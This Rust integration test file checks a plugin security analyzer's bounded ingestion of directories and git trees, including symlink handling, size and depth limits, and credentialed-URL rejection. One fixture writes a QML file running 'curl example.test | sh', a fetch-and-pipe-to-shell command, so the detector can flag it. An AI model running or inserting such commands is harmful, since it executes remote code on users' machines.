//! Integration coverage for bounded payload ingestion (v0.2 S1).

use std::fs;
use std::path::Path;
use std::time::Duration;

use omasafe_analyzer::{
    CoverageState, IngestError, Limits, PayloadKind, ingest_filesystem, ingest_pinned_tree,
};
use omasafe_core::bounds::TimeBudget;

fn tiny_limits(max_files: usize) -> Limits {
    Limits {
        max_files,
        max_file_bytes: 1024,
        max_total_bytes: 4096,
        max_tree_depth: 2,
    }
}

fn write(path: &Path, contents: &[u8], executable: bool) {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    fs::write(path, contents).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = if executable { 0o755 } else { 0o644 };
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).unwrap();
    }
}

/// A plugin-shaped tree exercising every S1 classification branch.
fn rich_tree(root: &Path) {
    write(&root.join("manifest.json"), br#"{"id":"x"}"#, false);
    write(&root.join("Main.qml"), b"import QtQuick\nItem {}\n", false);
    write(
        &root.join("lib/helper.js"),
        b"function f(){return 1}\n",
        false,
    );
    write(
        &root.join("scripts/install.sh"),
        b"#!/bin/sh\necho installing\n",
        true,
    );
    write(
        &root.join("scripts/setup.py"),
        b"#!/usr/bin/env python3\nprint('hi')\n",
        true,
    );
    // Extensionless executable with ELF magic.
    write(
        &root.join("bin/payload"),
        b"\x7fELF\x02\x01\x01\x00binary-payload",
        true,
    );
    // Non-executable data binary with NUL bytes.
    write(
        &root.join("assets/logo.bin"),
        b"PNG\x00\x00imagedata",
        false,
    );
    #[cfg(unix)]
    std::os::unix::fs::symlink("../manifest.json", root.join("link.json")).unwrap();
    fs::create_dir_all(root.join("empty-dir")).unwrap();
}

#[test]
fn inventories_every_entry_with_expected_kinds_and_states() {
    let temp = tempfile::tempdir().unwrap();
    rich_tree(temp.path());
    let inventory =
        ingest_filesystem(temp.path(), Limits::default(), TimeBudget::default()).unwrap();

    let kinds: Vec<(&str, &str)> = inventory
        .entries
        .iter()
        .map(|entry| (entry.relative_path.as_str(), entry.kind.as_str()))
        .collect();
    assert!(kinds.contains(&("manifest.json", "text-file")), "{kinds:?}");
    assert!(kinds.contains(&("Main.qml", "qml")), "{kinds:?}");
    assert!(kinds.contains(&("lib/helper.js", "javascript")));
    assert!(kinds.contains(&("scripts/install.sh", "shell")));
    assert!(kinds.contains(&("scripts/setup.py", "python")));
    assert!(kinds.contains(&("bin/payload", "elf-binary")));
    assert!(kinds.contains(&("assets/logo.bin", "data-binary")));

    let link = inventory
        .entries
        .iter()
        .find(|entry| entry.relative_path == "link.json")
        .expect("symlink inventoried");
    assert_eq!(link.kind, PayloadKind::Symlink);
    assert_eq!(link.link_target.as_deref(), Some("../manifest.json"));

    // No analyzer exists yet: fully read files are explicitly unsupported.
    assert_eq!(
        inventory.state_count(CoverageState::Unsupported),
        inventory.entries.len()
    );
    assert_eq!(inventory.state_count(CoverageState::Skipped), 0);
    assert!(
        inventory.limitations.is_empty(),
        "{:?}",
        inventory.limitations
    );
}

#[test]
fn walks_are_deterministic_across_runs() {
    let temp = tempfile::tempdir().unwrap();
    rich_tree(temp.path());
    let first = ingest_filesystem(temp.path(), Limits::default(), TimeBudget::default()).unwrap();
    let second = ingest_filesystem(temp.path(), Limits::default(), TimeBudget::default()).unwrap();
    assert_eq!(first, second);
}

#[cfg(unix)]
#[test]
fn symlinks_are_metadata_and_never_followed() {
    let temp = tempfile::tempdir().unwrap();
    let secret = temp.path().join("secret.txt");
    fs::write(&secret, b"outside-content").unwrap();
    let plugin = temp.path().join("plugin");
    fs::create_dir_all(&plugin).unwrap();
    std::os::unix::fs::symlink("../secret.txt", plugin.join("steal.json")).unwrap();

    let inventory = ingest_filesystem(&plugin, Limits::default(), TimeBudget::default()).unwrap();
    assert_eq!(inventory.entries.len(), 1);
    assert_eq!(inventory.entries[0].kind, PayloadKind::Symlink);
    // The target's content never enters the inventory.
    assert_ne!(inventory.entries[0].size, "outside-content".len() as u64);
    assert!(inventory.entries[0].sha256_sampled.is_none());
}

#[test]
fn file_limit_stops_enumeration_with_visible_loss() {
    let temp = tempfile::tempdir().unwrap();
    for index in 0..8 {
        write(&temp.path().join(format!("f{index}.txt")), b"x", false);
    }
    let inventory = ingest_filesystem(temp.path(), tiny_limits(4), TimeBudget::default()).unwrap();
    assert!(
        inventory
            .limitations
            .contains(&"file_limit_exceeded".to_owned())
    );
    assert!(inventory.entries.len() <= 5, "{}", inventory.entries.len());
    assert_eq!(inventory.total_files_seen, 5);
}

#[test]
fn depth_limit_discloses_skipped_subtrees() {
    let temp = tempfile::tempdir().unwrap();
    write(&temp.path().join("a/b/c/deep.txt"), b"deep", false);
    write(&temp.path().join("a/shallow.txt"), b"near", false);
    let inventory =
        ingest_filesystem(temp.path(), tiny_limits(100), TimeBudget::default()).unwrap();
    assert!(
        inventory
            .limitations
            .contains(&"tree_depth_limit_exceeded".to_owned())
    );
    assert!(
        !inventory
            .entries
            .iter()
            .any(|entry| entry.relative_path == "a/b/c/deep.txt")
    );
    assert!(
        inventory
            .entries
            .iter()
            .any(|entry| entry.relative_path == "a/b")
    );
    assert!(
        inventory
            .entries
            .iter()
            .any(|entry| entry.relative_path == "a/shallow.txt")
    );
}

#[test]
fn oversize_files_are_sampled_not_read() {
    let temp = tempfile::tempdir().unwrap();
    let mut big = vec![b'A'; 2048];
    big[0..4].copy_from_slice(b"\x7fELF");
    write(&temp.path().join("big.elf"), &big, false);
    let limits = Limits {
        max_file_bytes: 1024,
        ..tiny_limits(10)
    };
    let inventory = ingest_filesystem(temp.path(), limits, TimeBudget::default()).unwrap();
    let entry = inventory
        .entries
        .iter()
        .find(|entry| entry.relative_path == "big.elf")
        .expect("oversize file still inventoried");
    assert_eq!(entry.coverage_state, CoverageState::Skipped);
    assert!(entry.sampled_digest);
    assert_eq!(entry.kind, PayloadKind::ElfBinary, "classified from sample");
    assert_eq!(entry.size, 2048);
    assert!(
        inventory
            .limitations
            .contains(&"oversize_file_skipped".to_owned())
    );
}

#[test]
fn expired_budgets_stop_ingestion_immediately() {
    let temp = tempfile::tempdir().unwrap();
    rich_tree(temp.path());
    let budget = TimeBudget::new(Duration::from_millis(20));
    std::thread::sleep(Duration::from_millis(30));
    let inventory = ingest_filesystem(temp.path(), Limits::default(), budget).unwrap();
    assert!(
        inventory
            .limitations
            .contains(&"time_budget_exhausted".to_owned())
    );
    assert!(inventory.entries.is_empty());
}

#[cfg(unix)]
#[test]
fn special_files_are_recorded_and_skipped() {
    let temp = tempfile::tempdir().unwrap();
    let fifo = temp.path().join("pipe");
    let fifo_c = std::ffi::CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
    unsafe {
        libc::mkfifo(fifo_c.as_ptr(), 0o644);
    }
    let inventory =
        ingest_filesystem(temp.path(), Limits::default(), TimeBudget::default()).unwrap();
    assert_eq!(inventory.entries.len(), 1);
    assert_eq!(inventory.entries[0].kind, PayloadKind::Special);
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Skipped);
    assert!(
        inventory
            .limitations
            .contains(&"special_file_present".to_owned())
    );
}

#[test]
fn non_directory_targets_are_rejected_cleanly() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("file.txt");
    fs::write(&file, b"x").unwrap();
    match ingest_filesystem(&file, Limits::default(), TimeBudget::default()) {
        Err(IngestError::NotADirectory) => {}
        other => panic!("expected NotADirectory, got {other:?}"),
    }
}

// ---------------------------------------------------------------------------
// Immutable-revision object reader
// ---------------------------------------------------------------------------

/// Builds a bare repository holding one commit without any transport; the
/// reader frontend needs only object storage.
fn build_bare_repo() -> (tempfile::TempDir, String) {
    use std::process::Command;

    let temp = tempfile::tempdir().unwrap();
    let work = temp.path().join("work");
    let bare = temp.path().join("repo.git");

    let git = |args: &[&str], cwd: &Path| {
        let output = Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.test")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.test")
            .output()
            .expect("git must be runnable");
        assert!(
            output.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    fs::create_dir(&work).unwrap();
    write(&work.join("Main.qml"), b"Item {}\n", false);
    write(&work.join("install.sh"), b"#!/bin/sh\necho hi\n", true);
    write(&work.join("blob.bin"), b"\x00\x01data", false);
    git(&["init", "--quiet"], &work);
    git(&["add", "."], &work);
    git(&["commit", "--quiet", "-m", "initial"], &work);
    let head = {
        let output = Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(&work)
            .output()
            .unwrap();
        String::from_utf8(output.stdout).unwrap().trim().to_owned()
    };

    git(
        &[
            "clone",
            "--quiet",
            "--bare",
            work.to_str().unwrap(),
            bare.to_str().unwrap(),
        ],
        temp.path(),
    );
    (temp, head)
}

#[test]
fn pinned_tree_reader_inventories_objects_without_checkout() {
    let (_guard, head) = build_bare_repo();
    let repo = _guard.path().join("repo.git");
    let inventory =
        ingest_pinned_tree(&repo, &head, Limits::default(), TimeBudget::default()).unwrap();

    let kinds: Vec<(&str, &str)> = inventory
        .entries
        .iter()
        .map(|entry| (entry.relative_path.as_str(), entry.kind.as_str()))
        .collect();
    assert!(kinds.contains(&("Main.qml", "qml")), "{kinds:?}");
    assert!(kinds.contains(&("install.sh", "shell")));
    assert!(kinds.contains(&("blob.bin", "data-binary")));
    // Executable bit survives through the tree mode record.
    let install = inventory
        .entries
        .iter()
        .find(|entry| entry.relative_path == "install.sh")
        .unwrap();
    assert!(install.executable);
    // Every blob is fully hashed and explicitly unsupported pre-S2.
    assert!(
        inventory
            .entries
            .iter()
            .all(|entry| entry.sha256_sampled.is_some())
    );
    assert_eq!(
        inventory.state_count(CoverageState::Unsupported),
        inventory.entries.len()
    );
}

#[test]
fn pinned_tree_reader_rejects_bad_revisions() {
    let (_guard, _head) = build_bare_repo();
    let repo = _guard.path().join("repo.git");
    match ingest_pinned_tree(&repo, "not-hex", Limits::default(), TimeBudget::default()) {
        Err(IngestError::InvalidRevision) => {}
        other => panic!("expected InvalidRevision, got {other:?}"),
    }
}

#[test]
fn pinned_repository_rejects_credentialed_urls_before_any_git_call() {
    let temp = tempfile::tempdir().unwrap();
    let cache = temp.path().join("analysis");
    for url in [
        "https://user:token@example.test/repo.git",
        "https://token@github.com/example/repo.git",
    ] {
        match omasafe_analyzer::ensure_pinned_repository(
            &cache,
            url,
            "a64a6f4a5b6f4a5b6f4a5b6f4a5b6f4a5b6f4a5b",
        ) {
            Err(IngestError::InvalidUrl) => {}
            other => panic!("expected InvalidUrl for {url}, got {other:?}"),
        }
    }
    // No cache directory was created for rejected URLs.
    assert!(!cache.join("analysis").exists());
}

#[test]
fn quota_walk_does_not_follow_symlinks() {
    let temp = tempfile::tempdir().unwrap();
    let cache = temp.path().join("cache");
    fs::create_dir_all(&cache).unwrap();
    let outside = tempfile::tempdir().unwrap();
    let huge = outside.path().join("huge.bin");
    fs::write(&huge, vec![0u8; 4096]).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(&huge, cache.join("innocent.git.link")).unwrap();

    // The quota check itself is private; verify indirectly by ensuring the
    // public entry point succeeds on a cache whose only bulk content is a
    // symlink target outside the cache root.
    match omasafe_analyzer::ensure_pinned_repository(
        &cache,
        "https://example.invalid/repo.git",
        "a64a6f4a5b6f4a5b6f4a5b6f4a5b6f4a5b6f4a5b",
    ) {
        Err(IngestError::Git(message)) => {
            // Network failure is expected offline; the point is that the
            // quota walk did not explode or follow the link.
            assert!(!message.is_empty());
        }
        Err(IngestError::BudgetExhausted) => {}
        Err(other) => panic!("unexpected error: {other:?}"),
        Ok(_) => panic!("example.invalid cannot resolve; success is impossible here"),
    }
}

#[test]
fn oversize_repo_blobs_become_skipped_entries_instead_of_aborting() {
    use omasafe_analyzer::ingest_pinned_tree as ingest;
    let guard_temp = tempfile::tempdir().unwrap();
    let work = guard_temp.path().join("work");
    let bare = guard_temp.path().join("repo.git");

    let git = |args: &[&str], cwd: &Path| {
        let output = std::process::Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.test")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.test")
            .output()
            .expect("git must be runnable");
        assert!(
            output.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    fs::create_dir(&work).unwrap();
    write(&work.join("small.txt"), b"tiny", false);
    let mut big = vec![b'B'; 3 * 1024 * 1024];
    big[0..4].copy_from_slice(b"\x7fELF");
    write(&work.join("big.elf"), &big, false);
    git(&["init", "--quiet"], &work);
    git(&["add", "."], &work);
    git(&["commit", "--quiet", "-m", "big"], &work);
    let head = {
        let output = std::process::Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(&work)
            .output()
            .unwrap();
        String::from_utf8(output.stdout).unwrap().trim().to_owned()
    };
    git(
        &[
            "clone",
            "--quiet",
            "--bare",
            work.to_str().unwrap(),
            bare.to_str().unwrap(),
        ],
        guard_temp.path(),
    );

    let limits = Limits {
        max_file_bytes: 1024 * 1024,
        ..Limits::default()
    };
    let inventory = ingest(&bare, &head, limits, TimeBudget::default()).unwrap();

    let small = inventory
        .entries
        .iter()
        .find(|entry| entry.relative_path == "small.txt")
        .expect("small file inventoried");
    assert_eq!(small.coverage_state, CoverageState::Unsupported);

    let big_entry = inventory
        .entries
        .iter()
        .find(|entry| entry.relative_path == "big.elf")
        .expect("oversize blob still inventoried");
    assert_eq!(big_entry.coverage_state, CoverageState::Skipped);
    assert!(big_entry.sampled_digest);
    assert_eq!(
        big_entry.kind,
        PayloadKind::ElfBinary,
        "classified from sample"
    );
    assert_eq!(big_entry.size, 3 * 1024 * 1024, "declared size preserved");
    assert!(
        inventory
            .limitations
            .contains(&"oversize_file_skipped".to_owned())
    );
}

#[test]
fn pinned_tree_analysis_reads_blob_contents_through_object_ids() {
    // End-to-end: ingest a bare repo, then run detectors over raw blob reads
    // exactly like the CLI's GitRepository content source does.
    let guard_temp = tempfile::tempdir().unwrap();
    let work = guard_temp.path().join("work");
    let bare = guard_temp.path().join("repo.git");
    fs::create_dir(&work).unwrap();
    std::fs::write(
        work.join("Main.qml"),
        b"Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n",
    )
    .unwrap();
    let git = |args: &[&str], cwd: &Path| {
        let output = std::process::Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.test")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.test")
            .output()
            .unwrap();
        assert!(output.status.success());
    };
    git(&["init", "--quiet"], &work);
    git(&["add", "."], &work);
    git(&["commit", "--quiet", "-m", "x"], &work);
    let head = String::from_utf8(
        std::process::Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(&work)
            .output()
            .unwrap()
            .stdout,
    )
    .unwrap()
    .trim()
    .to_owned();
    git(
        &[
            "clone",
            "--quiet",
            "--bare",
            work.to_str().unwrap(),
            bare.to_str().unwrap(),
        ],
        guard_temp.path(),
    );

    let mut inventory =
        ingest_pinned_tree(&bare, &head, Limits::default(), TimeBudget::default()).unwrap();

    // The CLI's reader: bounded cat-file by object id, size-verified,
    // digest-verified against the ingested sample.
    let read_content = |entry: &omasafe_analyzer::PayloadEntry| -> Option<Vec<u8>> {
        use sha2::Digest;
        if entry.sampled_digest {
            return None;
        }
        let oid = entry.object_id.as_deref()?;
        let output = std::process::Command::new("git")
            .args(["cat-file", "blob", oid])
            .current_dir(&bare)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .output()
            .ok()?;
        if !output.status.success() || output.stdout.len() as u64 != entry.size {
            return None;
        }
        let digest = sha2::Sha256::digest(&output.stdout);
        let hex_digest: String = digest.iter().map(|b| format!("{b:02x}")).collect();
        (hex_digest == entry.sha256_sampled.as_deref()?).then_some(output.stdout)
    };

    let artifacts =
        omasafe_analyzer::analyze_inventory(&mut inventory, &read_content, &TimeBudget::default());
    let findings = artifacts.rendered_findings();
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert_eq!(findings[0].rule_id, "oma.qml.process-execution");
    assert_eq!(
        findings[0].confidence.as_deref(),
        Some("ast-backed"),
        "git-sourced analysis is parser-backed like any other"
    );
}
